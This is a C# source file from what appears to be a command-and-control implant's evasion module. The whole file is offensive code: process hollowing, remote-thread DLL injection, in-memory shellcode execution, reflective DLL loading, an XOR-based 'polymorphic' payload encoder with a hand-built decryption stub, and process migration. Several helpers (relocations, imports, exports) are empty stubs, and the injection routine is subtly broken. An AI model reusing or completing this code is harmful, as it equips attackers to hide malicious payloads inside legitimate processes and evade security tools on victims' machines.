using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeraphC2.Implant.Core.Evasion;

/// <summary>
/// Implements process hollowing technique for executing code within legitimate processes
/// </summary>
public class ProcessHollowing : IAdvancedEvasion
{
    #region Win32 API Declarations

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint dwSize,
        out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    #endregion

    #region Structures

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public FLOATING_SAVE_AREA FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] ExtendedRegisters;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct FLOATING_SAVE_AREA
    {
        public uint ControlWord;
        public uint StatusWord;
        public uint TagWord;
        public uint ErrorOffset;
        public uint ErrorSelector;
        public uint DataOffset;
        public uint DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint Cr0NpxState;
    }

    #endregion

    #region Constants

    private const uint CREATE_SUSPENDED = 0x00000004;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint CONTEXT_FULL = 0x10007;

    #endregion

    public async Task<ProcessHollowingResult> ExecuteProcessHollowingAsync(string targetProcess, byte[] payload)
    {
        var result = new ProcessHollowingResult();

        try
        {
            // Create the target process in suspended state
            var startupInfo = new STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);

            if (!CreateProcess(
                targetProcess,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out PROCESS_INFORMATION processInfo))
            {
                result.ErrorMessage = $"Failed to create process: {Marshal.GetLastWin32Error()}";
                return result;
            }

            result.ProcessId = (int)processInfo.dwProcessId;
            result.ProcessHandle = processInfo.hProcess;
            result.ThreadHandle = processInfo.hThread;

            // Get the thread context to find the entry point
            var context = new CONTEXT();
            context.ContextFlags = CONTEXT_FULL;

            if (!GetThreadContext(processInfo.hThread, ref context))
            {
                result.ErrorMessage = $"Failed to get thread context: {Marshal.GetLastWin32Error()}";
                CleanupProcess(processInfo);
                return result;
            }

            // Read the PEB to get the image base address
            var pebBuffer = new byte[IntPtr.Size];
            if (!ReadProcessMemory(processInfo.hProcess, (IntPtr)(context.Ebx + 8), pebBuffer, (uint)pebBuffer.Length, out _))
            {
                result.ErrorMessage = $"Failed to read PEB: {Marshal.GetLastWin32Error()}";
                CleanupProcess(processInfo);
                return result;
            }

            var imageBase = BitConverter.ToInt32(pebBuffer, 0);

            // Unmap the original image
            var unmapResult = NtUnmapViewOfSection(processInfo.hProcess, (IntPtr)imageBase);
            if (unmapResult != 0)
            {
                result.ErrorMessage = $"Failed to unmap view of section: {unmapResult}";
                CleanupProcess(processInfo);
                return result;
            }

            // Parse PE headers to get required information
            var peInfo = ParsePEHeaders(payload);
            if (peInfo == null)
            {
                result.ErrorMessage = "Invalid PE file format";
                CleanupProcess(processInfo);
                return result;
            }

            // Allocate memory for the new image
            var newImageBase = VirtualAllocEx(
                processInfo.hProcess,
                (IntPtr)peInfo.ImageBase,
                peInfo.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (newImageBase == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to allocate memory: {Marshal.GetLastWin32Error()}";
                CleanupProcess(processInfo);
                return result;
            }

            // Write the PE headers
            if (!WriteProcessMemory(processInfo.hProcess, newImageBase, payload, peInfo.SizeOfHeaders, out _))
            {
                result.ErrorMessage = $"Failed to write PE headers: {Marshal.GetLastWin32Error()}";
                CleanupProcess(processInfo);
                return result;
            }

            // Write each section
            for (int i = 0; i < peInfo.NumberOfSections; i++)
            {
                var section = peInfo.Sections[i];
                if (section.SizeOfRawData > 0)
                {
                    var sectionData = new byte[section.SizeOfRawData];
                    Array.Copy(payload, section.PointerToRawData, sectionData, 0, section.SizeOfRawData);

                    var sectionAddress = IntPtr.Add(newImageBase, (int)section.VirtualAddress);
                    if (!WriteProcessMemory(processInfo.hProcess, sectionAddress, sectionData, section.SizeOfRawData, out _))
                    {
                        result.ErrorMessage = $"Failed to write section {i}: {Marshal.GetLastWin32Error()}";
                        CleanupProcess(processInfo);
                        return result;
                    }
                }
            }

            // Update the entry point in the thread context
            context.Eax = (uint)(newImageBase.ToInt32() + peInfo.AddressOfEntryPoint);
            if (!SetThreadContext(processInfo.hThread, ref context))
            {
                result.ErrorMessage = $"Failed to set thread context: {Marshal.GetLastWin32Error()}";
                CleanupProcess(processInfo);
                return result;
            }

            // Resume the thread to execute the hollowed process
            if (ResumeThread(processInfo.hThread) == 0xFFFFFFFF)
            {
                result.ErrorMessage = $"Failed to resume thread: {Marshal.GetLastWin32Error()}";
                CleanupProcess(processInfo);
                return result;
            }

            result.Success = true;
            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = $"Exception during process hollowing: {ex.Message}";
            return result;
        }
    }

    public async Task<DllInjectionResult> InjectDllAsync(int processId, byte[] dllBytes)
    {
        var result = new DllInjectionResult();

        try
        {
            var process = Process.GetProcessById(processId);
            var processHandle = process.Handle;

            // Allocate memory in the target process
            var allocatedMemory = VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                (uint)dllBytes.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (allocatedMemory == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to allocate memory: {Marshal.GetLastWin32Error()}";
                return result;
            }

            // Write the DLL bytes to the allocated memory
            if (!WriteProcessMemory(processHandle, allocatedMemory, dllBytes, (uint)dllBytes.Length, out _))
            {
                result.ErrorMessage = $"Failed to write DLL bytes: {Marshal.GetLastWin32Error()}";
                return result;
            }

            // Get the address of LoadLibrary
            var kernel32 = LoadLibrary("kernel32.dll");
            var loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");

            if (loadLibraryAddr == IntPtr.Zero)
            {
                result.ErrorMessage = "Failed to get LoadLibrary address";
                return result;
            }

            // Create a remote thread to execute the DLL
            var remoteThread = CreateRemoteThread(
                processHandle,
                IntPtr.Zero,
                0,
                loadLibraryAddr,
                allocatedMemory,
                0,
                out uint threadId);

            if (remoteThread == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to create remote thread: {Marshal.GetLastWin32Error()}";
                return result;
            }

            // Wait for the thread to complete
            WaitForSingleObject(remoteThread, 5000);

            result.Success = true;
            result.ModuleHandle = allocatedMemory;
            result.RemoteThreadHandle = remoteThread;

            CloseHandle(remoteThread);
            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = $"Exception during DLL injection: {ex.Message}";
            return result;
        }
    }

    public async Task<MemoryExecutionResult> ExecuteInMemoryAsync(byte[] payload, string[] arguments = null)
    {
        var result = new MemoryExecutionResult();

        try
        {
            // Allocate executable memory
            var executableMemory = VirtualAllocEx(
                Process.GetCurrentProcess().Handle,
                IntPtr.Zero,
                (uint)payload.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (executableMemory == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to allocate executable memory: {Marshal.GetLastWin32Error()}";
                return result;
            }

            // Copy payload to executable memory
            Marshal.Copy(payload, 0, executableMemory, payload.Length);

            // Create a delegate to execute the code
            var executeDelegate = Marshal.GetDelegateForFunctionPointer<ExecuteDelegate>(executableMemory);

            // Execute the code
            var exitCode = executeDelegate();

            result.Success = true;
            result.ExecutionAddress = executableMemory;
            result.ExitCode = exitCode;

            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = $"Exception during memory execution: {ex.Message}";
            return result;
        }
    }

    public async Task<ReflectiveDllResult> LoadReflectiveDllAsync(byte[] dllBytes, string exportFunction = null)
    {
        var result = new ReflectiveDllResult();

        try
        {
            // Parse PE headers
            var peInfo = ParsePEHeaders(dllBytes);
            if (peInfo == null)
            {
                result.ErrorMessage = "Invalid PE file format";
                return result;
            }

            // Allocate memory for the DLL
            var moduleBase = VirtualAllocEx(
                Process.GetCurrentProcess().Handle,
                IntPtr.Zero,
                peInfo.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (moduleBase == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to allocate memory for DLL: {Marshal.GetLastWin32Error()}";
                return result;
            }

            // Copy headers
            Marshal.Copy(dllBytes, 0, moduleBase, (int)peInfo.SizeOfHeaders);

            // Copy sections
            for (int i = 0; i < peInfo.NumberOfSections; i++)
            {
                var section = peInfo.Sections[i];
                if (section.SizeOfRawData > 0)
                {
                    var sectionAddress = IntPtr.Add(moduleBase, (int)section.VirtualAddress);
                    Marshal.Copy(dllBytes, (int)section.PointerToRawData, sectionAddress, (int)section.SizeOfRawData);
                }
            }

            // Process relocations (simplified)
            ProcessRelocations(moduleBase, peInfo, dllBytes);

            // Resolve imports (simplified)
            ResolveImports(moduleBase, peInfo);

            result.Success = true;
            result.ModuleBase = moduleBase;

            // If export function specified, find its address
            if (!string.IsNullOrEmpty(exportFunction))
            {
                result.ExportAddress = GetExportAddress(moduleBase, peInfo, exportFunction);
            }

            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = $"Exception during reflective DLL loading: {ex.Message}";
            return result;
        }
    }

    public async Task<byte[]> GeneratePolymorphicVariantAsync(byte[] originalPayload)
    {
        // This is a simplified implementation - real polymorphic engines are much more complex
        var variant = new byte[originalPayload.Length];
        Array.Copy(originalPayload, variant, originalPayload.Length);

        // Add simple XOR obfuscation
        var key = (byte)Random.Shared.Next(1, 255);
        for (int i = 0; i < variant.Length; i++)
        {
            variant[i] ^= key;
        }

        // Add decryption stub at the beginning (simplified)
        var decryptionStub = GenerateDecryptionStub(key, variant.Length);
        var result = new byte[decryptionStub.Length + variant.Length];
        Array.Copy(decryptionStub, 0, result, 0, decryptionStub.Length);
        Array.Copy(variant, 0, result, decryptionStub.Length, variant.Length);

        return result;
    }

    public async Task<bool> MigrateToProcessAsync(string targetProcessPath)
    {
        try
        {
            // Get current process bytes
            var currentProcess = Process.GetCurrentProcess();
            var currentProcessBytes = File.ReadAllBytes(currentProcess.MainModule.FileName);

            // Perform process hollowing with current process
            var result = await ExecuteProcessHollowingAsync(targetProcessPath, currentProcessBytes);

            if (result.Success)
            {
                // Exit current process after successful migration
                Environment.Exit(0);
            }

            return result.Success;
        }
        catch
        {
            return false;
        }
    }

    #region Helper Methods

    private delegate int ExecuteDelegate();

    private void CleanupProcess(PROCESS_INFORMATION processInfo)
    {
        if (processInfo.hProcess != IntPtr.Zero)
            CloseHandle(processInfo.hProcess);
        if (processInfo.hThread != IntPtr.Zero)
            CloseHandle(processInfo.hThread);
    }

    private PEInfo? ParsePEHeaders(byte[] peBytes)
    {
        try
        {
            if (peBytes.Length < 64) return null;

            // Check DOS signature
            if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) return null;

            // Get PE header offset
            var peOffset = BitConverter.ToInt32(peBytes, 60);
            if (peOffset >= peBytes.Length - 4) return null;

            // Check PE signature
            if (BitConverter.ToUInt32(peBytes, peOffset) != 0x00004550) return null;

            var peInfo = new PEInfo();
            
            // Parse COFF header
            peInfo.NumberOfSections = BitConverter.ToUInt16(peBytes, peOffset + 6);
            
            // Parse optional header
            var optionalHeaderOffset = peOffset + 24;
            peInfo.AddressOfEntryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
            peInfo.ImageBase = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 28);
            peInfo.SizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
            peInfo.SizeOfHeaders = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 60);

            // Parse sections
            var sectionHeaderOffset = optionalHeaderOffset + 224; // Standard optional header size
            peInfo.Sections = new SectionInfo[peInfo.NumberOfSections];

            for (int i = 0; i < peInfo.NumberOfSections; i++)
            {
                var sectionOffset = sectionHeaderOffset + (i * 40);
                peInfo.Sections[i] = new SectionInfo
                {
                    VirtualAddress = BitConverter.ToUInt32(peBytes, sectionOffset + 12),
                    SizeOfRawData = BitConverter.ToUInt32(peBytes, sectionOffset + 16),
                    PointerToRawData = BitConverter.ToUInt32(peBytes, sectionOffset + 20)
                };
            }

            return peInfo;
        }
        catch
        {
            return null;
        }
    }

    private byte[] GenerateDecryptionStub(byte key, int payloadLength)
    {
        // Simplified decryption stub - in reality this would be much more sophisticated
        return new byte[]
        {
            0x60, // PUSHAD
            0xBE, 0x00, 0x00, 0x00, 0x00, // MOV ESI, payload_address (to be patched)
            0xB9, (byte)(payloadLength & 0xFF), (byte)((payloadLength >> 8) & 0xFF), 0x00, 0x00, // MOV ECX, payload_length
            0x80, 0x36, key, // XOR BYTE PTR [ESI], key
            0x46, // INC ESI
            0xE2, 0xFA, // LOOP -6
            0x61, // POPAD
            0xC3 // RET
        };
    }

    private void ProcessRelocations(IntPtr moduleBase, PEInfo peInfo, byte[] dllBytes)
    {
        // Simplified relocation processing
        // In a real implementation, this would properly handle all relocation types
    }

    private void ResolveImports(IntPtr moduleBase, PEInfo peInfo)
    {
        // Simplified import resolution
        // In a real implementation, this would resolve all imported functions
    }

    private IntPtr GetExportAddress(IntPtr moduleBase, PEInfo peInfo, string exportFunction)
    {
        // Simplified export resolution
        // In a real implementation, this would parse the export table
        return IntPtr.Zero;
    }

    #endregion

    #region Helper Classes

    private class PEInfo
    {
        public uint AddressOfEntryPoint { get; set; }
        public uint ImageBase { get; set; }
        public uint SizeOfImage { get; set; }
        public uint SizeOfHeaders { get; set; }
        public ushort NumberOfSections { get; set; }
        public SectionInfo[] Sections { get; set; } = Array.Empty<SectionInfo>();
    }

    private class SectionInfo
    {
        public uint VirtualAddress { get; set; }
        public uint SizeOfRawData { get; set; }
        public uint PointerToRawData { get; set; }
    }

    #endregion
}